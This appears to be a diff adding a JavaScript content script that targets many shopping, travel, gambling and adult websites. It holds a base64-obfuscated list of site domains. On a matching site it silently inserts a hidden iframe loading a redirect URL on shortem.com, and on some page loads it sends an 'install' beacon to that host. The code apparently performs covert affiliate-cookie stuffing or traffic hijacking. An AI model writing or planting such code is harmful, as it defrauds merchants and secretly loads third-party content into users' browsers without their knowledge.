@@ -1,0 +1,68 @@
+function countStr(string, subString, allowOverlapping) {
+    string += ""; subString += "";
+    if (subString.length <= 0) return (string.length + 1);
+    var n = 0, pos = 0, step = allowOverlapping ? 1 : subString.length;
+    while (true) {
+        pos = string.indexOf(subString, pos);
+        if (pos >= 0) {
+            ++n;
+            pos += step;
+        } else break;
+    }
+    return n;
+}
+
+function trouverDom() {
+	var d = document.location.hostname;
+    var p = d.split('.');
+	if("com" == p[p.length-1])
+		return p[p.length-2] + '.' + p[p.length-1];
+	else if(p.length > 2) {
+		var a = [ "com.au","com.br","co.uk","com.ph","com.my","co.th","co.id","com.tw","com.hk","co.in","co.kr" ];
+		for (var i = 0; i < a.length; i++) {
+			if(a[i] == p[p.length-2] + '.' + p[p.length-1])
+				return p[p.length-3] + '.' + p[p.length-2] + '.' + p[p.length-1];
+		}
+	} 
+	return p[p.length-2] + '.' + p[p.length-1];
+}
+
+function theCheck(host) {
+	var a = { 'Ym9va2luZy5jb20=' : 1,'YWxpZXhwcmVzcy5jb20=' : 1,'YWdvZGEuY29t' : 1,'Y2VudGF1cm8uY29tLmJy' : 1,'bmV0c2hvZXMuY29tLmJy' : 1,'emF0dGluaS5jb20uYnI=' : 1,'cG9zdGhhdXMuY29tLmJy' : 1,'Y2VhLmNvbS5icg==' : 1,'cmljYXJkb2VsZXRyby5jb20uYnI=' : 1,'Y2FzYXNiYWhpYS5jb20uYnI=' : 1,'aW1hZ2luYXJpdW0uY29tLmJy' : 1,'dGlueWRlYWwuY29t' : 1,'ZmxpcGthcnQuY29t' : 1,'bm9yZHN0cm9tLmNvbQ==' : 1,'aG90ZWxzLmNvbQ==' : 1,'bGl2ZWphc21pbi5jb20=' : 1,'Y2hhdHVyYmF0ZS5jb20=' : 1,'Yndpbi5jb20=' : 1,'Yndpbi5lcw==' : 1,'Yndpbi5iZQ==' : 1,'c3BvcnRpdW0uZXM=' : 1,'YW55b3B0aW9uLmNvbQ==' : 1,'YmV0Ym9vLmNvbQ==' : 1,'YmV0c3Nvbi5jb20=' : 1,'bWFybWFyYS5jb20=' : 1,'aG90ZWlzLmNvbQ==' : 1,'ZGVzcGVnYXIuY29t' : 1,'YXNvcy5jb20=' : 1,'ZHguY29t' : 1,'Z2VhcmJlc3QuY29t' : 1,'bGlnaHRpbnRoZWJveC5jb20=' : 1,'bWluaWludGhlYm94LmNvbQ==' : 1,'bmlrZS5jb20=' : 1,'d2FsbWFydC5jb20=' : 1,'YmFuZ2dvb2QuY29t' : 1,'cmVudGFsY2Fycy5jb20=' : 1,'cm9zZWdhbC5jb20=' : 1,'dGFyZ2V0LmNvbQ==' : 1,'aG90ZWxzY29tYmluZWQuY29t' : 1,'YmFja2NvdW50cnkuY29t' : 1,'Y2FiZWxhcy5jb20=' : 1,'Z2FwLmNvbQ==' : 1,'amNwZW5uZXkuY29t' : 1,'b3ZlcnN0b2NrLmNvbQ==' : 1,'cGllcjEuY29t' : 1,'c2Ftc2NsdWIuY29t' : 1,'c2VwaG9yYS5jb20=' : 1,'c3VybGF0YWJsZS5jb20=' : 1,'bXludHJhLmNvbQ==' : 1,'amFib25nLmNvbQ==' : 1,'c3VibWFyaW5vLmNvbS5icg==' : 1,'dm9lZ29sLmNvbS5icg==' : 1,'d2FsbWFydC5jb20uYnI=' : 1,'YmFsYW9kYWluZm9ybWF0aWNhLmNvbS5icg==' : 1,'ZXh0cmEuY29tLmJy' : 1,'Z2lyYWZhLmNvbS5icg==' : 1,'bWFnYXppbmVsdWl6YS5jb20uYnI=' : 1,'bWVnYW1hbXV0ZS5jb20uYnI=' : 1,'bmlrZS5jb20uYnI=' : 1,'cG9udG9mcmlvLmNvbS5icg==' : 1,'c2VwaGEuY29tLmJy' : 1,'c2hvcHRpbWUuY29tLmJy' : 1,'c2VwaG9yYS5jb20uYnI=' : 1,'Y3ZjLmNvbS5icg==' : 1,'YW1lcmljYW5hcy5jb20uYnI=' : 1,'Zm5hYy5jb20uYnI=' : 1,'dHJhdmVzc2EuY29tLmJy' : 1,'bW9ibHkuY29tLmJy' : 1,'bGl2cmFyaWEuZm9saGEuY29tLmJy' : 1,'cmloYXBweS5jb20uYnI=' : 1,'YW5uYXBlZ292YS5jb20uYnI=' : 1,'Y2x1YmVkb3JpY2FyZG8uY29tLmJy' : 1,'bGl2cmFyaWFjdWx0dXJhLmNvbS5icg==' : 1,'ZnV0ZmFuYXRpY3MuY29tLmJy' : 1,'dmlhamFuZXQuY29tLmJy' : 1,'c3VwZXJtdWZmYXRvLmNvbS5icg==' : 1,'Ym9ucHJpeC5jb20uYnI=' : 1,'aG9wZWxpbmdlcmllLmNvbS5icg==' : 1,'Y2xhc3NpY3Rlbm5pcy5jb20uYnI=' : 1,'c2llbm8uY29tLmJy' : 1,'bWFzaC5jb20uYnI=' : 1,'Y29tcHJlaWVtZXUuY29tLmJy' : 1,'Y2x1YmVkb21hbHRlLmNvbS5icg==' : 1,'bW9kYWl0LmNvbS5icg==' : 1,'a2lwbGluZy5jb20uYnI=' : 1,'Y2FsY2Fkb3NvbmxpbmUuY29tLmJy' : 1,'aGF2YW4uY29tLmJy' : 1,'b2xob2Zhc2hpb24uY29tLmJy' : 1,'b2t1bG9zLmNvbS5icg==' : 1,'cGJraWRzLmNvbS5icg==' : 1,'Z2VyYWNhb3BldC5jb20uYnI=' : 1,'YW1hem9uLmNvbS5icg==' : 1,'ZHJvZ2FyaWFzYW9wYXVsby5jb20uYnI=' : 1,'bXVsdGlhci5jb20uYnI=' : 1,'am9pYXNsdWxlYW4uY29tLmJy' : 1,'ZHJvZ2FyaWFzcGFjaGVjby5jb20uYnI=' : 1,'bG9qYW11bHRpbGFzZXIuY29tLmJy' : 1,'cG5ldXN0b3JlLmNvbS5icg==' : 1,'bW9uYW1hLmNvbS5icg==' : 1,'bmV3YmFsYW5jZS5jb20uYnI=' : 1,'dHZ6LmNvbS5icg==' : 1,'amFuc3BvcnQuY29tLmJy' : 1,'Y2hpY29yZWkuY29t' : 1,'c2NodW1hbm4uY29tLmJy' : 1,'YWlyZG9sb21pdGkuaXQ=' : 1,'dHJpcGFkdmlzb3IuaXQ=' : 1,'ZXhwZWRpYS5pdA==' : 1,'ZWRyZWFtcy5pdA==' : 1,'ZmxpeGJ1cy5pdA==' : 1,'c2t5c2Nhbm5lci5pdA==' : 1,'dHVpLml0' : 1,'c2l4dC5lcw==' : 1,'c2t5c2Nhbm5lci5lcw==' : 1,'cnVtYm8uZXM=' : 1,'dmlhamVzZWxjb3J0ZWluZ2xlcy5lcw==' : 1,'bWVkaWFtYXJrdC5ydQ==' : 1,'cGxlZXIucnU=' : 1,'b2xkaS5ydQ==' : 1,'c3Z5YXpub3kucnU=' : 1,'Y2l0aWxpbmsucnU=' : 1,'b3N0aW4uY29t' : 1,'c3RvbHBsaXQucnU=' : 1,'a29yYWJsaWsucnU=' : 1,'c2hvcGNsdWVzLmNvbQ==' : 1,'dGF0YWNsaXEuY29t' : 1,'Ymlncm9jay5pbg==' : 1,'bWFrZW15dHJpcC5jb20=' : 1,'YmlnYmFza2V0LmNvbQ==' : 1,'ZWJheS5pbg==' : 1,'YW1hem9uLmlu' : 1,'ZXhwZWRpYS5mcg==' : 1,'ZXVyb3BjYXIuZnI=' : 1,'YWJjcm9pc2llcmUuY29t' : 1,'ZmxpeGJ1cy5mcg==' : 1,'ZWRyZWFtcy5mcg==' : 1,'YmVsYW1icmEuZnI=' : 1,'ZWJvb2tlcnMuZnI=' : 1,'b3VpZ28uY29t' : 1,'aG90ZWxyZXNlcnZpZXJ1bmcuZGU=' : 1,'YWlybGluZS1kaXJlY3QuZGU=' : 1,'bGF6YWRhLmNvbS5waA==' : 1,'bGF6YWRhLmNvbS5teQ==' : 1,'bGF6YWRhLmNvLmlk' : 1,'bGF6YWRhLmNvLnRo' : 1,'bGF6YWRhLnNn' : 1,'bGF6YWRhLnZu' : 1,'ZXhwZWRpYS5jb20uaGs=' : 1,'ZXhwZWRpYS5jby5pbg==' : 1,'ZXhwZWRpYS5jby5rcg==' : 1,'ZXhwZWRpYS5jb20udHc=' : 1,'ZXhwZWRpYS5jb20ucGg=' : 1,'ZXhwZWRpYS5jby50aA==' : 1,'ZXhwZWRpYS5jby5pZA==' : 1,'ZXhwZWRpYS5jb20ubXk=' : 1,'emFsb3JhLmNvbS5waA==' : 1,'emFsb3JhLmNvbS5teQ==' : 1,'emFsb3JhLmNvLmlk' : 1,'emFsb3JhLmNvLnRo' : 1,'emFsb3JhLnNn' : 1,'emFsb3JhLnZu' : 1,'ODg4LmNvbQ==' : 1,'ODg4Lml0' : 1,'ODg4LnJv' : 1,'ODg4Y2FzaW5vLmNvbQ==' : 1,'ODg4Y2FzaW5vLmVz' : 1,'ODg4Y2FzaW5vLml0' : 1,'ODg4Y2FzaW5vLmRr' : 1,'ODg4Y2FzaW5vLnJv' : 1,'ODg4cG9rZXIuY29t' : 1,'ODg4cG9rZXIuZXM=' : 1,'ODg4cG9rZXIucm8=' : 1,'ODg4cG9rZXIuZGs=' : 1,'ODg4c3BvcnQuY29t' : 1,'ODg4c3BvcnQuZXM=' : 1,'ODg4c3BvcnQuaXQ=' : 1,'ODg4c3BvcnQuZGs=' : 1,'ODg4c3BvcnQucm8=' : 1,'cGVnaXBlZ2kuY29t' : 1};
+	if(a[host]) return true; else return false;
+}
+
+function theCall(version,hash) {
+	var r = new XMLHttpRequest(); 
+	r.open("GET", '//'+'shortem.com'+'/r/'+version+'/'+hash+'/', true);
+	r.onreadystatechange = function () { if (r.readyState != 4 || r.status != 200) return; };
+	r.send("");
+}
+
+function theInsCheck() {
+	if(typeof(Storage) !== "undefined") {
+		// Code for localStorage
+		if(!localStorage.getItem("_ins")) {
+			theCall('v1','ins')
+			localStorage.setItem("_ins", 1);
+			localStorage.setItem("_ins_t", new Date().getTime());
+		} else {
+			// Check expiration!
+		}
+	} else {
+		// Sorry! No Web Storage support...
+	}
+}
+
+if(self == top){
+	var to = Date.now() / 1000 | 0;
+	if(!(to%4))
+		theInsCheck();
+	var d = trouverDom();
+	if(theCheck(btoa(d))) {
+		var iframe = document.createElement('iframe');
+		iframe.style.display = "none";
+		iframe.src = '//shortem.com/r/v1/aHe94/';
+		document.body.appendChild(iframe);
+	}
+}
